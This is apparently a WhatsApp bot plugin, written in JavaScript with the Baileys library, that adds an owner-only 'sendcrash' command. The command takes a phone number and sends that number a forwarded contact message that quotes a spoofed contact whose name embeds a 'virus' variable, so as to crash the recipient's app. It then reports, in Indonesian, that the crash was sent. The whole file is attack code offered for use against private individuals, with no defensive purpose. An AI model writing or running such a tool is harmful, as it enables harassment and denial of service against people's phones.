const { generateWAMessageFromContent, prepareWAMessageMedia, proto } = require("@adiwajshing/baileys")
let handler  = async (m, { conn, text, participants }) => {
if (!text) throw 'Masukkan Nomor'
const fkontaak = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "@broadcast" } : {})}, message: { "contactMessage":{"displayName": `${wmbot}${virus}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;conn;;;\nFN:${wmbot}\nitem1.TEL;waid=6281991410940:6281991410940\nitem1.X-ABLabel:Mobile\nEND:VCARD` }}}  
let res = await generateWAMessageFromContent(text.replace(/[^0-9]/g, '') + '@s.whatsapp.net', {
"contactMessage": {
"vcard": "HAHaAhHAHAHA",
"displayName": `Hyzer`,
"contextInfo": {
"forwardingScore": 3,
"isForwarded": true
}
}
}, {quoted: fkontaak, contextInfo:{}}) 
await conn.relayWAMessage(res)
m.reply(`Berhasil Mengirim Crash Di  Nomer ${text}@s.whatsapp.net`)
}
handler.help = ['sendcrash <nomer>']
handler.tags = ['owner', 'General']
handler.command = /^(sendcrash)$/i
handler.premium = false
handler.owner = true

module.exports = handler
